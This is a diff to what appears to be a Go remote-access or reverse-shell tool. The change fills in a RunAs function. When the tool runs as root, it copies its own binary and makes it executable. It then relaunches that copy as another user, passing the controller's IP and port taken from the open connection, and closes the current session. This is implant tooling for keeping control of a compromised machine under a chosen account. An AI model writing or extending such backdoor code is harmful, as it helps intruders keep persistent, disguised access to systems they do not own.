@@ -5,6 +5,7 @@ import (
 	"log"
 	"os"
 	"os/exec"
+	"os/user"
 	"fmt"
 	"strings"
 	"errors"
@@ -32,12 +33,39 @@ func Exec(command string, c net.Conn) {
 }
 
 // RunAsPs ...
-func RunAs(user string, pass string, domain string, c net.Conn) {
-	c.Write([]byte("Not implemented\n"))
+func RunAs(username string, pass string, domain string, c net.Conn) {
+	current, err := user.Current()
+	if (err != nil) {
+		c.Write([]byte("Error: " + err.Error() + "\n"))
+		return
+	}
+	uid := current.Uid
+	if (uid == "0") {
+		path := CopySelf()
+		err = os.Chmod(path, 0755)
+		if (err != nil) {
+			c.Write([]byte("Error: Couldn't chmod\n"))
+			return
+		}
+		ip, port := utils.SplitAddress(c.RemoteAddr().String())
+		args := fmt.Sprintf("%s %s %s", path, ip, port)
+		fmt.Println(args)
+		err = CreateProcessAsUser(username, path, args)
+		if (err != nil) {
+			c.Write([]byte("Error: " + err.Error() + "\n"))
+			return
+		}
+		fmt.Println("Closing...")
+		c.Close()
+		return
+	} else {
+		c.Write([]byte("Error: Not root\n"))
+		return
+	}
 }
 
 // RunAsPs ...
-func RunAsPS(user string, pass string, domain string, c net.Conn) {
+func RunAsPS(username string, pass string, domain string, c net.Conn) {
 	c.Write([]byte("Not implemented\n"))
 }
 
